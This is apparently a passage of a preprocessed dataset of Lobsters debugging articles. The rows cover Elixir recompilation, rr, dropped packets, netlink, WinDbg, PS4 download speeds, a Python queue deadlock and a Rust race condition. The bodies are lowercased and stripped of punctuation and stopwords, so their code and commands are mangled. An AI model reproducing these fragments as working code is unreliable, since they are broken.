defmodule external externalresource pathjoin dir externaltxt defmacro read fileread externalresource end end externaltxt chapter chris mccord book metaprogramming elixir contains example showing attribute used implement elixir unicode support dependency relationship shown xref output verify work using inotifywait command shown previously trick used untangle realworld code base general advice dirty trick break compile time dependency use hide module compiler example changing association schema described following scenario schemaaex defmodule schemaa use ectoschema schema tablea belongsto b moduleconcat schemab end end schemabex defmodule schemab use ectoschema schema tableb field lol string end end dependency graph would digraph xref graph libschemaaex libschemabex although possible need make sure safe break dependency call anything concat module risk stale beam file might present hard reproduce bug use last resort cycle dependency graph huge red flag cycle single compile labeled edge whenever module member cycle changed file cycle file depend recompiled notice cycle dependency graph graph algorithm might help used kosaraju algorithm find strongly connected component dependency graph helped eliminate cycle reducing number recompiled file avoid cycle cost require import module needlessly also would like thank jose valim time helping sort issue codebase help invaluable fundamental success task footnote come erlang way inject code module via header file hrl mechanism akin c include statement erlang compiler erlc provides option generate makefile tracking header dependency far know changing header hrl file situation erlang code need recompilation
398,Lobsters,debugging,Debugging,rr 5.0 Released,http://robert.ocallahan.org/2017/09/rr-50-released.html,rr released,rr stabilize trace format trapping cpuid instruction brotli compression debuggeride integration,released rr kyle convinced trace stability portability worth major version bump release note introduction cap n proto stabilize trace format recording created rr release replayable future rr release plan promise since nt know might happen future hopeful new rr pack command make recording selfcontained packed recording one machine replayed different machine trapping cpuid instruction supported replay machine nt much experience yet far good brotli compression smaller trace lower recording overhead improvement rr commandline argument ease debuggeride integration rr replay accepts argument following argument passed debugger verbatim also bare rr command smarter choosing default subcommand following argument directory default subcommand replay otherwise record performance improvement especially pathological case lot switching rr supervisor process syscall support expanded many bug fixed enjoy
399,Lobsters,debugging,Debugging,Finding out if/why a server is dropping packets,https://jvns.ca/blog/2017/09/05/finding-out-where-packets-are-being-dropped/,finding ifwhy server dropping packet,even know packet dropped email protected know packet dropped http githubcompavelodintsovdropwatch monitoring dropped packet perf thomas graf advanced reading tell know,packet dropped computer dropped reason find whetherwhy packet dropped situation want understand packet enters network stack computer rx say port get dropped application listening port receives send packet tx make computer get dropped interested packet dropped somewhere else internet let diagnose traceroute counting tcp retransmits though important even know packet dropped asked twitter got useful answer look netstat look like laptop email protected sudo netstat kernel interface table iface mtu met rxok rxerr rxdrp rxovr txok txerr txdrp txovr flg bmu bmru lo lru oru look like received rx packet lost wireless card tx packet lost though someone also told running ethtool useful ethtool option know packet dropped googling found cool tool called dropwatch ubuntu package github http githubcompavelodintsovdropwatch instruction worked compile sudo aptget install binutilsdev git clone http githubcompavelodintsovdropwatch cd dropwatchsrc vim makefile comment werror argument gcc make output tell kernel function losing packet cool sudo dropwatch l ka initalizing kallsyms db dropwatch start enabling monitoring kernel monitoring activated issue ctrlc stop monitoring drop drop drop drop drop drop monitoring dropped packet perf another cool way debug happening thomas graf told monitor kfreeskb event using perf tell packet dropped kernel stack happened sudo perf record g e skb kfreeskb sudo perf script advanced reading also two cool article still read full extremely detailed cool tell know still ever used tool seriously debug packet loss problem yet wanted write note want future better tip debugging whetherwhy packet dropped computer let know
401,Lobsters,debugging,Debugging,Debugging netlink requests,https://jvns.ca/blog/2017/09/03/debugging-netlink-requests/,debugging netlink request,netlink see netlink message strace say decoding netlink message http program debugging working network interface id great great example way capture netlink message tcpdump wireshark ip monitor nltrace nltrace,week working kubernetes networking problem basically container network backend reporting delete route know started reading code failing using library called netlink never heard week netlink wikipedia say netlink socket family linux kernel interface used interprocess communication ipc kernel userspace process different userspace process way similar unix domain socket program debugging creatingdeleting route route table seems like netlink capable lot thing communicate kernel userspace userspace userspace case happening pretty simple userspace program creates netlink socket userspace program sends message socket asking kernel delete route kernel deletes route case fails return error message see netlink message strace let create netlink message luckily easy use ip tool create delete route us netlink ip route add via dev lo ip route del via dev lo cool let strace command strace f x ip route add via dev lo output socket pfnetlink sockrawsockcloexec netlinkroute bind safamilyafnetlink getsockname safamilyafnetlink sendmsg msgname safamilyafnetlink msgiov recvmsg msgname safamilyafnetlink msgiov see creates netlink socket bind sends message receives response okay message say message super understandable right well luckily python tool help u understand save file called message decoding netlink message googled decode netlink message found great page http decoding netlink message turned pretty simple run pip install wget http python decoderpy message output attrs rtadst rtagateway rtaoif dstlen family flag header flag length pid sequencenumber type proto scope srclen table tos type understand going focus part attrs rtadst rtagateway rtaoif dst gateway field pretty easy understand program debugging working see rtaoif field field network interface id example laptop right network interface numbered correct message rtaoif set lo loopback interface lo loopback lowerup mtu qdisc noqueue state unknown mode default group default qlen linkloopback brd broadcast multicast lowerup mtu qdisc pfifofast state mode default group default qlen linkether brd ff ff ff ff ff ff broadcast multicast mtu qdisc mq state mode dormant group default qlen linkether bc brd ff ff ff ff ff ff nocarrier broadcast multicast mtu qdisc noqueue state mode default group default linkether brd ff ff ff ff ff ff noarp lowerup mtu qdisc noqueue state unknown mode default group default qlen linknetlink errant program rtaoif field set even valid value field think valid network interface id great really cool wanted write quick script understand going network interface route would definitely try lot great example example want run equivalent ip route add via dev lo import iproute ip iproute iproute add super simple mean dev lo way capture netlink message tcpdump wireshark also use tcpdump capture netlink message create network interface sudo ip link add type nlmon sudo ip link set dev sudo tcpdump w netlinkpcap capture packet wireshark netlinkpcap look result wireshark tried trouble couple reason work server working though work laptop actually found harder work strace method captured many packet found hard filter wireshark ip monitor also run ip monitor tell netlink request run print stuff sudo ip monitor dev lladdr router stale dev lladdr router stale dev lladdr ba stale dev lladdr ba probe dev lladdr ba stale dev lladdr ba reachable dev lladdr router probe dev lladdr router reachable dev lladdr router probe dev lladdr router reachable give information wanted though nltrace also nltrace instance nltrace ip route list case give information wanted maintained project look maybe useful always make happy learn new linux thing course job middle tweeted kubernetes cool definitely easy experience definitely like learn networking work excruciating detail definitely feel true le like set networking work like pick networking backend wait month discover weird problem strace learn thing netlink rtaoif fix bug eventually work maybe everyone experience experience far
402,Lobsters,debugging,Debugging,New WinDbg available in preview!,https://blogs.msdn.microsoft.com/windbg/2017/08/28/new-windbg-available-in-preview/,new windbg available preview,new windbg available preview article getting startedâ installation http feedback http insiderwindowscomenushowtofeedback question documentation http gomicrosoftcomfwlinkp http blogsmsdnmicrosoftcomwindbg video defrag tool defrag tool newâ le intimidatingâ ribbon reworked file menu familiar source window quality life improvementsâ dark theme recent target various window improvement data model front centerâ http blogsmsdnmicrosoftcomwindbg javascript natvis extensible local watch model window builtin scripting environment restriction thing worth notingâ,new windbg available preview minute read article excited announce preview version brand new windbg updated windbg modern visuals faster window fullfledged scripting experience built easily extensible debugger data model front center start saying windbg preview using underlying engine windbg today command extension workflow used still work beforeâ getting startedâ know lot going want dive right try thing know soâ install windbg preview store window anniversary update newer http windbg preview us feature window anniversary update required window store let u release bug fix update faster ever able make sure stayed tuned blog msdn learn latest previewâ familiarize bit feedback hub still got long way go cover windbg feature using feedback hub help u prioritize want u work window insider website great overview give good feedback http insiderwindowscomenushowtofeedback read hit feedback hub button home ribbonâ bound lot question feel free post blog post send feedback feedback hub best answer posting faq blog sometime upcoming weeksâ got early documentation msdn preliminary subject change http gomicrosoftcomfwlinkp give u feedback propose edits documentation hitting comment edit page also keep eye msdn blog http blogsmsdnmicrosoftcomwindbg update tipsâ went channel studio recorded couple episode defrag tool help explain basic windbg previewâ â defrag tool tim chad go basic windbg preview featuresâ defrag tool nick tim chad use windbg preview go quick demoâ coming soon defrag tool bill andrew walk scripting feature windbg previewâ newâ lot major change hood really obvious favorite thing people told like bestâ le intimidatingâ one word people often use describe windbg intimidating first open get dull gray screen little indication next going outside stepping icon difficult tell toolbar button menu want windbg preview taken step make bit easier beginnersâ ribbon great icon nt great job describing action lot different contextual action relevant sometimes right ribbon pretty barebones basic time adding ribbon specific context debuggingâ reworked file new file menu make much clear option starting configuring debugging session attach dialog much cleaner organized even new option launch store app background task without needing set plmdebugexeâ familiar source source window better pretty much every way look like source window used seeing every modern editorâ quality life improvementsâ windbg gone long time without major quality life improvement modernization led lot people registry hack get prettier theme dozen icon pinned taskbar thing debug often taken workarounds made easy accessâ dark one pretty selfexplanatory lot people use dark theme editor flip glaring brightness windbg match â recent instead kdnet key ip stickynote monitor windbg preview remember recent session setting session quickly access recent target list file menuâ various window many window gone without update glaring bug notable thing done differently disassembly window keep highlighting right spot scrolled memory window better highlighting scrolling many window also asynchronous loading cancelled running another commandâ data model front centerâ hopefully heard debugger data model nt check older blog post http blogsmsdnmicrosoftcomwindbg msdn doc around javascript natvis data model accessible javascript windbg preview putting data model vast majority see making much extensibleâ extensible local data model powering local watch window natvis javascript extension extend data model reflected window even put linq query watch window â model new type window called model window model window show result model query normal hierarchy view table see faq windbg preview nt module window use model window make cursessionmodules also benefit make javascript extension extends module automatically update windowâ builtin scripting one biggest complaint scripting extending debugger go ide write iterate windbg preview write execute javascript natvis directly debugger script window error highlighting intellisense easier execution scriptsâ restriction thing worth notingâ got big list new awesome still preview thing aware ofâ point preview offering windbg preview window store mean device running window anniversary update install itâ might hit error trying something requires elevation manually launch windbg preview elevatedâ concept workspace going changing lot workspace windbg preview vastly different one windbg msdn documentation linked informationâ today core experience releasing improvement faster normal pace shipping window store please nt hesitate send u feedback feature request feedback hub comment want input move forward â â andy luhrsâ
405,Lobsters,debugging,Debugging,Why PS4 downloads are so slow,https://www.snellman.net/blog/archive/2017-08-19-slow-ps4-downloads/,downloads slow,conclusion background experiment experiment conclusion speculation footnote,game downloads reputation slow many people reporting downloads order magnitude faster steam xbox long list thing look pretty low priority operating system based reasonably modern freebsd crippling issue tcp stack implication problem something boring like inadequately dimensioned cdn heard people successfully using local http proxy workaround pretty rare actually help download speed made sound like much interesting problem going longwinded technical post interested detail investigation want recommendation speeding downloads skip straight conclusion background running experiment good mental model thing testing work problem might nothing else guide initial experiment design speed steadystate tcp connection basically defined three number amount data client receive single roundtrip tcp receive window amount data server willing send single roundtrip tcp congestion window round trip latency client server rtt first approximation connection speed speed min rwin cwin rtt model could proxy speed connection well proxy original connection split two mostly independent part one connection client proxy another proxy server speed endtoend connection determined slower two independent connection speedproxyclient min client rwin proxy cwin clientproxy rtt speedserverproxy min proxy rwin server cwin proxyserver rtt speed min speedproxyclient speedserverproxy local proxy clientproxy rtt low connection almost guaranteed faster one improvement serverproxy connection somehow better direct clientserver one rtt change two option either client much smaller receive window proxy client somehow causing server congestion window decrease eg client randomly dropping received packet proxy nt two theory receive window one much likely concentrate first replaces original question new one would client receive window low becomes noticeable bottleneck fairly limited number cause low receive window seen wild nt really seem fit maybe client nt support tcp window scaling option proxy without window scaling receive window limited since know sony started tcp stack support window scaling would go way disable slow downloads benefit maybe actual downloader application slow operating system supposed certain amount buffer space available connection network delivering data o faster application reading buffer start fill o reduce receive window form backpressure ca nt reason application bottleneck bottleneck without proxy operating system trying dynamically scale receive window match actual network condition something going wrong would interesting hoping find initial theory place let get digging experiment first experiment start psn download baseline nonslim firmware network connection bridged linux machine add latency network using tc netem varying added latency able find two thing whether receive window really bottleneck whether receive window automatically scaled operating system clientserver rtts measured packet capture using tcp timestamps look like experimental period dot represents second time single connection axis showing minimum rtt seen connection second next graph show amount data sent server one round trip red receive window advertised client blue first since blue dot staying constantly operating system nt appear kind receive window scaling based rtt much theory though right end graph receive window shoot nt totally fixed either second receive window bottleneck blue dot would close red dot case mysteriously bottleneck move server nt find quite looking couple interesting thing correlated event download foreground whole duration test nt mean thing running machine netflix app still running background completely idle background app closed receive window increased dramatically suggests second experiment different application opened closed left running background time receive window stop bottleneck close entering rest mode look like another thing worth investigating unfortunately true rest mode red herring experiment graph receive window second download annotated timing various noteworthy event difference receive window different time striking important change receive window correspond well specific thing download started game styx shard darkness running background idling title screen download limited receive window incredibly low value basically going cause downloads take time longer coincidence whenever game running receive window would low app running eg netflix spotify limited receive window reduction potential download speed moving apps game download window foreground background nt effect receive window launching game horizon zero dawn uncharted dreadnought seemed effect running app playing online match networked game dreadnought caused receive window artificially limited playing around nonnetworked game horizon zero dawn inconsistent effect receive window effect seemingly depending intensity gameplay look like genuine resource restriction download process getting variable amount cpu rather artificial limit ran speedtest time downloads limited receive window got decent receive window conclusion artificial receive window limit appears apply psn downloads putting rest mode effect builtin feature ui like web browser count apps game started causing previously running game stopped automatically receive window could increase brief period time basically appears receive window get unclamped old game stop clamped second later new game actually start test run seemed support finding additional information testing rest mode behavior dependent setting originally set suspend apps rest mode setting disabled apps would closed entering rest mode downloads would proceed full speed receive window absolutely crippling user window might ok user cdn server close nt particularly fast internet example location receive window would cap downloads depending cdn dns rng happens give lowest two speed tier isp either would noticeable problem mean downloads artificially limited speed conclusion application running appears change setting psn store downloads artificially restricting speed closing application remove limit important detail leaving application running background help exact limit applied whether download progress bar foreground putting rest mode might might help depending system setting artificial limit applies psn store downloads affect eg builtin speedtest speedtest might report much higher speed actual downloads even though delivered cdn server application equal cause connection slow factor game cause difference factor game start factor migrate factor leave start menu start playing limit artificial addition actively playing game cause game downloads slow appears due genuine lack cpu resource game understandably top priority seeing slow downloads closing running application might worth shot obviously guaranteed help cause slow downloads well remove one potential bottleneck close running application need longpress p button controller select close application menu nt make obvious exactly program running game interaction model opening new game close previously running one apps work remain background indefinitely explicitly close get worse configured suspend running apps put rest mode seemingly power machine clean state still hidden background app causing o limit psn download speed might explain superstition internet people swear putting machine rest mode help speed others say nothing every firmware update people report increased download speed odds nothing actually changed firmware people done first full reboot finally system without background app running speculation fact see unfortunately raise new question ca nt answered experimentally fact option except speculate wildly q intentional feature purpose yes must intentional receive window change rapidly application game openedclosed reason kind subtle operating system level behavior likely ui explicitly manipulating socket receive buffer think idea must allow network traffic background downloads take resource away foreground use example playing online shooter make sense harshly limit background download speed make sure game getting ping time low predictable least point receive window limit circumstance harder see point receive window limit running app single game download random cdn nt going muscle netflix youtube thing think afraid multiple simultaneous downloads eg due automatic update might cause problem playing video even seems like stretch alternate theory due nonnetwork resource constraint eg cpu memory disk nt think work cpu disk constraint appropriate priority place would automatically take care download process get starved cpu disk bandwidth due low priority receive buffer would fill receive window would scale dynamically exactly needed amount ram talking miniscule machine ram le megabyte q feature implemented well oh dear god hard believe sloppy implementation biggest problem limit get applied based gamesapplications currently running insane matter gamesapplications someone currently using especially console ui totally reasonable expectation foreground application get priority got download progress bar foreground system damn well give download priority application started month ago nt used since applying limit rest mode suspended apps beyond insane second limit get applied perconnection got single download going get limited receive window got five downloads get total mean efficiency make sure downloads nt clog network policy depends purely many downloads active rubbish controlled application level application know many downloads active really optimal static receive window x split evenly across downloads third core idea applying static receive window mean fighting bufferbloat fundamentally broken using receive window rate limiting mechanism mean actual transfer rate depend rtt local proxy help kind thing work well ca nt rate limit depend rtt also ca nt somebody come number apply limit everyone limit need depend actual network condition way detect congested downlink clientside tcp stack proper fix would implement adjust receive window lowpriority background downloads congestion becomes issue would actually pretty valuable feature kind appliance kind forgive one shelf feature maybe sony nt employ tcp kernel hacker fourth whatever method used decide whether game networklatency sensitive broken absurd demo singleplayer game idling initial title screen would cause download speed totally crippled really limited actual multiplayer title ideally period someone actually playing game online game running enough q still problem year launch idea sony must know psn download speed butt joke year probably biggest complaint people system hard believe nobody ever given task figuring slow rocket science anyone bothering look would find problem day seems equally impossible know cause decided apply trivial fix hell would nt even need proper technical fix could piece text saying downloads work faster apps closed possible speculate informed manner thing particular question remain open mystery big company nt always get thing done efficiently eh footnote
406,Lobsters,debugging,Debugging,The tragic tale of the deadlocking Python queue,https://codewithoutrules.com/2017/08/16/concurrency-python/,tragic tale deadlocking python queue,concurrency hard race condition deadlock queue make concurrency simpler buggy program debugging deadlock reentrancy weakref callback signal handler real encountered multiple people directly supported sqlalchemy orm python maintainer fixed reported difficult problem crochet library oh wait fixed thank update takeaway simplequeue sign software clown newsletter,story difficult build concurrent program also story bug python queue class class happens easiest way make concurrency simple python happy story tragedy story deadlock despair story take veritable roller coaster emotion elucidation shiver horror concurrent programming bask simplicity using queue frown mysteriously freezing program marvel discover debug deadlock gdb groan reentrancy rear ugly head gasp realize bug theoretical weep read response python maintainer rejoice hear python maintainer new response join share tale woe concurrency hard writing program concurrency program multiple thread hard without thread code linear line executed line nothing happening add thread change happen behind back race condition following counter example become corrupted increment called multiple thread threading import thread class counter object def init self selfvalue def increment self selfvalue c counter def go range cincrement run two thread increment counter thread targetgo thread targetgo print cvalue run program raceconditionpy incremented time got problem selfvalue actually take three distinct step getting attribute incrementing setting attribute two thread call increment object around time following series step may happen thread get selfvalue happens thread get selfvalue happens thread increment thread set selfvalue thread increment thread set selfvalue increment lost due race condition one way solve lock threading import lock class counter object def init self selfvalue selflock lock def increment self selflock selfvalue one thread time hold lock one increment happens time deadlock lock introduce set problem example start potential issue deadlock imagine two lock one thread try acquire followed whereas another thread try acquire followed thread acquire hold thread acquire hold thread try acquire use wait thread try acquire use wait thread deadlocked execution proceed queue make concurrency simpler one way make concurrency simpler using queue trying shared data structure thread send message thread using queue thread never mutate data structure shared thread result code much closer singlethreaded code function run one line time need worry thread interrupting example single thread whose job manage collection counter collection import defaultdict threading import thread queue import queue class counter object def init self selfvalue def increment self selfvalue counterqueue queue def countersthread counter defaultdict counter true get next command queue command name counterqueueget command increment counter name increment start new thread thread targetcountersthread start thread safely increment named counter counterqueueput increment buggy program unfortunately queue broken edge case consider following program program involves thread queue import queue q queue class circular object def init self selfcircular self def del self print adding queue gc qput range print iteration create object garbage collected asynchronously therefore del method called later circular print adding queue regularly qput little trickery involving circular reference order add item queue garbage collection default cpython default python vm us reference counting garbage collect object object created count incremented reference removed count decremented reference count hit zero object removed memory del called however object reference circular class always reference count least python also run garbage collection pas every catch object using circular reference causing circulardel called asynchronously eventually rather immediately let run program bugpy iteration adding queue regularly adding queue gc program continues run print nothing iteration progress going debugging deadlock gdb modern version gdb debugger neat pythonspecific feature including ability print python traceback setup little annoying see maybe bit googling setup extremely useful let see gdb tell u process first attach running process use bt command see c backtrace p x grep bugpy bugpy gdb pid gdb bt futexabstimedwaitcancelable dofutexwait semsem newsemwaitslow newsemwait sem optimized pythreadacquirelocktimed look like process waiting lock wonder next take look python backtrace gdb pybt traceback recent call first builtin method enter threadlock object remote file line enter return selflockenter file line put selfnotfull file bugpy line del qput garbagecollecting file line notify waiterstonotify deque islice allwaiters n file line put selfnotemptynotify file bugpy line module qput see going reentrancy remember said lacking concurrency code run one line time lie garbage collection interrupt python function point run arbitrary python code del method weakref callback signal handler happen eg hit ctrlc process get sigint signal subprocess dy process get sigchld signal case program calling qput involves acquiring lock halfway function call garbage collection happens garbage collection call circulardel circulardel call qput qput try acquire lock already held wait qput stuck waiting garbage collection finish garbage collection finish qput release lock program deadlocked real scenario may seem little farfetched encountered multiple people real world common cause logging writing log disk worry disk write blocking ie taking long time particularly case log writes followed syncingtodisk often done ensure log lost crash common pattern create log message application thread thread actual writing disk different thread easiest way communicate message course queuequeue use case fact directly supported python standard library queue import queue import logging logginghandlers import queuelistener queuehandler write queued log file logqueue queue queuelistener logqueue loggingfilehandler outlog start push log queue logginggetlogger addhandler queuehandler logqueue given common setup need trigger bug log message del weakref callback signal handler happens real code example explicitly close file python warn inside filedel python also standard api routing warning logging system logging though bug also encountered among others sqlalchemy orm python maintainer fixed bug originally reported closed wont fix difficult problem feel copout using extremely common logging pattern writes happen different thread logging pattern explicitly supported python standard program might deadlock particular deadlock library using writes log message del happen using standard python apis like file routing happened one user crochet library due logging del twisted framework implement queuing system ensure user impacted problem fix problem python maintainer example queueget queueput could atomic operation done cpython rewriting c could argue del anything schedule stuff run outside scheduling reentrant code tricky fact different mutating shared data structure multiple thread queue sort could call bug oh wait fixed thank update wrote blog post python dev team reopened bug fixed python new queue class thanks pythondev takeaway concurrency hard deal queuequeue help reentrancy hard deal python help lot le using queuequeue python beware interacting queue del weakref callback signal handler python use simplequeue apparently way enjoyed reading would like hear many way screwed software sign software clown newsletter every week share one mistake avoid thanks maciej fijalkowski suggesting actually demonstrating race condition pointing del probably really anything thanks ann yanich pointing typo code thanks pythondev team fixing problem wrote
407,Lobsters,debugging,Debugging,Debugging a Race Condition in a Release Target,http://blog.boxofrox.me/2017/08/debugging-a-rust-release-build.html,debugging race condition release target,rust developing favorite fuzzy search program symptom first step wireshark bug mysql parser mysql protocol short self contained correct example sscce sscce github presenting reverse debugger rust user forum enter gdb preparation xdg gdbdashboard pygments assembly outoforder execution optimized variable hoorah strike one strike two home run rfc rust story anomaly machine last four byte empty one time fix found pull request lesson learned wisdom conclusion,back june working rust project unfortunate opportunity stumble upon obscure bug dependency bug nt occur debug build target release target even bug nt present hovered cover obstacle encountered tool used applied story involves rust stable nightly along gdb reverse debugger rr developing customer mine us opensource software manage inventory organize inventory unorthodox method searching mysql query multiple field scattered across table slowed crawl second size inventory grew top search result lacked scoring many result irrelevant decided solve problem perhaps writing custom fuzzy search daemon periodically fetch searchable data database cache allow inventory software exchange search term much shorter list relevant search result chose rust program daemon anticipation orchestrating many task incorporated inputoutput io bound settled using tokio async framework along mysqlasync crate provides database api utilizing tokio created initial proof concept poc rewriting favorite fuzzy search program scoring algorithm relevant need search data exported customer database placed csv file avoid complexity database programming stage testing fuzzy search showed performed abysmally debug target upward second match score candidate release target operated millisecond also promising search data used poc consumed mb symptom found bug story demonstrates monopolizing testing debug target may postpone disaster near end project prefer identify bug early possible via spot testing troubleshooting le code suspect add new feature eg config file db support http interface endpoint etc test mostly debug target moving another feature check release target ensure performance nt dropped significantly release target test database addition mysqlasync first reported packetoutoforder error retested dozen time found error occurred frequently every time dsnmysql testbot testbot debug running thread main panicked error resolving future error packetoutoforder state nexterror none backtrace none note run backtrace problem single query pull megabyte data mysql server cache information facilitate fast search application ca nt frequently fail pull megabyte data retry without putting unwanted load network database must understand application run flawlessly slow debug target blazingly fast release target game afoot first step long time ago eschewed window favor linux year discarded integrated development environment ides difficult build system opinionated project layout cough lack vim keybindings cough much enjoyed commandline versatility development tool live except gnu debugger gdb kryptonite debugging program typically last resort nt paid technical debt master matter use proficiently firstpick method determining program versus print statement since error originated mysqlasync cloned crate locally modified print mysql packet sequence id found error diff git asrcconnfuturesreadpacketrs bsrcconnfuturesreadpacketrs index asrcconnfuturesreadpacketrs bsrcconnfuturesreadpacketrs impl future readpacket let packet let conn selfconnasmut unwrap connseqid seqid debug packet order found expected seqid connseqid return err errorkind packetoutoforderinto connstream stream output test run confirmed sequence break expected found test run found error never occurs mysql packet program receiving garbage database buggy dsnmysql testbot testbot mysqlasyncdebug debug running connection handshake query submission debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id sequence repeating id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync conn future readpacket packet order found expected thread main panicked error resolving future error packetoutoforder state nexterror none backtrace none note run backtrace previously used mysql database server extensively variety test past without issue inclined suspect suddenly broke nt like uncertainty hovering shoulder trying troubleshoot tendency accumulate besides quick network packet analysis wireshark confirm whether problem application beyond network interface card nic yep quick analysis turn wireshark nifty dissectors parse protocol within protocol one mysql found malformed mysql packet whew glad cause nt random intermittent behavior program nt looking forward bug hunt come learn thorough attention detail essential troubleshoot productively always look result different angle verify accord back wireshark go able cross reference last sequence id print statement wireshark packet capture packet prior malformed packet sequence id print statement claim parsed sequence id finding also get malformed mysql packet wireshark test run succeeds bueno much quick jinxed ouput corresponding wireshark capture screenshot dsnmysql testbot testbot mysqlasyncdebug debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync conn future readpacket packet order found expected thread main panicked error resolving future error packetoutoforder state nexterror none backtrace none point story took long detour debug wireshark mysql dissector wo nt go detail reported bug found workaround recompiled wireshark patch back business malformed mysql packet afterwards captured mysql packet program reset tcp connection database wireshark show sequence id order repeatedly think safe say network hardware functioning properly along database good measure tested spare mariadb database application still suffers packetoutoforder note entire time reran single sql query one dataset every query execution transfer identical data database point application fails random point parsing sql packet certain failure occurs instruction different iteration loop executing instruction could switch debugger stop random point breakpoint code noticed mismatched sequence id couple problem heading direction backtrack random point familiar gdb reverse debugging running program backwards rather rely point without reverse debugging need cause problem program stack hit breakpoint since using future write asynchronous code good chance cause longer program stack debugging optimized release target optimization prevent gdb accessing variable ie print var also reorder instruction program follows different order execution source code present release target debugging information prevents gdb matching assembly code source code later found rust build release target debugging information add following cargotoml profilerelease debug true let try get ahead point program run awry mysql parser mysql protocol start rather simple fourbyte header hold threebyte length onebyte sequence id header followed length byte data data must parsed point ignore case data contains row result set select query run point application fails data section influence parsing mysql packet added extra print statement mysqlasync code parsed network data mysql packet give brief playbyplay description process answer question like start new packet waiting byte header header value find get data three maybe four print statement error disappears remove print statement error return add error vanishes bug appears race condition print statement delay parsing loop long enough bug manifest severely hamper ability generate clue using one two print statement collect information nt effective bug present random point execution path stepping forward application gdb certainly delay execution prevent race condition manifesting nt sure sure debug asked help short self contained correct example asking programmingdebugging advice fraught peril provide detail person trying help must fill blank using imagination ask question former lead thread confusion irrelevant solution similarbutdifferent problem latter quickly cascade waste everyone time help imagine someone else asking help solve problem consider information would need hand providing much information make problem difficult understand identify wise sage internet love nothing impart correct knowledge least fuss end short self contained correct example sscce terrific tool demonstrates problem allows intrepid programmer fully understand task hand find specific pertinent solution test solution work submission also often case generating sscce detailed question stumble upon answer question presented underestimate utility exercise matter tedious one additional benefit sscce small quicker compile large application poking prodding source code see effect short compile time matter time post sscce github stripped away application code left use example mysqlasync readme code longer suspect far software stack go chase bug presenting reverse debugger rust user forum inejge recommended try rr nifty bit software record traffic program outside world intercepting syscalls rr integrates gdb allow replay recording henceforth referred trace forward reverse chance rr may add much overhead application prevent race condition fantastic work installing rr creating trace simply rr record program took try managed capture trace packetoutorder error ouput corresponding wireshark capture screenshot dsnmysql testbot testbot mysqlasyncdebug rr record debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync proto last seq id debug mysqlasync conn future readpacket packet order found expected thread main panicked error resolving future error packetoutoforder state nexterror none backtrace none still wanted get ahead error dive gdb trying one print statement spot settled one diff git asrciomodrs bsrciomodrs index asrciomodrs bsrciomodrs impl stream stream stream newpacket parseresult incomplete mut newpacket needed debug data need byte needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen diff git asrcprotors bsrcprotors index asrcprotors bsrcprotors impl newpacket else let length selfheader unwrap selflastseqid selfheader debug last seq id selflastseqid debug last seq id selflastseqid selfheaderclear length return parseresult done packet payload selfdata selflastseqid take quick peek output sscce veers track run iteration parsing loop packetoutoforder error occurs whole mess code nt step backwards confident nt missed detail lurking mess even better needed variable jump consistently set conditional breakpoint gdb stop needed dsnmysql testbot testbot mysqlasyncdebug rr record hundred line needing byte debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte boom debug mysqlasync io data need byte debug mysqlasync io data need byte debug mysqlasync io data need byte line needing byte problem detected debug mysqlasync conn future readpacket packet order found expected thread main panicked error resolving future error packetoutoforder state nexterror none backtrace none want take quick moment point detail missed start wanted determine packet order error occurs failed notice answer depends another question parser read header invalid length field byte yet header contains sequence id order missed detail would later develop suspicion rust optimizer might contain obscure bug enter gdb preparation ready fire gdb simple rr replay open latest trace gdb archlinux rr trace stored homelocalsharerr idea nt homecacherr per xdg spec want open earlier replay use rr replay homelocalsharerr trace dir specify particular trace fluent reader assembly code let alone translating assembly back rust wanted gdb match assembly source code generated must tell gdb find rust source code mysqlasync fork modified let current working folder project establish source code found let make sure rust source code machine rustup component list grep src rustsrc installed rustsrc appeared rustup component add rustsrc download install rust source file highly recommend rustup already using inside gdb updated search path gdb directory gdb directory homeboxofroxfilesdevelopmentrustcratesmysqlasync one small snag though debugging info application binary say rust source code root folder checkout easily fixed substitutepath setting gdb set substitutepath checkoutsrc src gdb show substitutepath list source path substitution rule checkoutsrc src last thing set gdbdashboard amazing piece software expands usability gdb new horizon throw pygments python library pip install pygments gdb start rival fancy ides left behind taken care time start debugging assembly outoforder execution optimized variable hoorah area code focused begin line srciomodrs mysqlasync shown let nextpacket match nextpacket parseresult done packet seqid selfnextpacket newpacket empty parse return ok ready packet seqid parseresult needheader mut newpacket needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpushheader byte buflen shouldpoll true newpacket parseresult incomplete mut newpacket needed debug data need byte needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpush byte buflen shouldpoll true newpacket first order business set conditional breakpoint run program break execution line gdb breakpoint needed gdb continue debug running debug mysqlasync proto last seq id error testing breakpoint condition value optimized value optimized curse value would otherwise permanent residence memory location named needed debug target vagrant wandering cpu register program stack one hassle dealt outoforder execution converting source code machine code precise order wrote code nt maximize performance cpu compiler rearrange instruction long behavior program nt change worry source code making sense compiler worry performance aspect due optimization error breakpoint longer conditional still break line assembly gdb tflavored assembly instruction written opcode src dest prefer intelflavored assembly setting assembly ja mysqlasync io mov rbx lea rbp rax mov rax rbp lea rip rax core fmt num fmt mov rax rbp lea rip rax refad source newpacket parseresult incomplete mut newpacket needed debug data need byte needed let bufhandle selfbufasmut unwrap let buflen bufhandlelen byte bufhandledrain cmp min needed buflen newpacketpush byte idea assembly evaluating self selfbuf asmut unwrap likely never know half possibility probably invalid thanks rust zerocost abstraction happy let get track need find needed value hiding moment program around line oclock always find place let backtrack line gdb reversenext debug data need byte needed gdb reversenext parseresult incomplete mut newpacket needed assembly mov rcx rbp mov rbp mov rbp 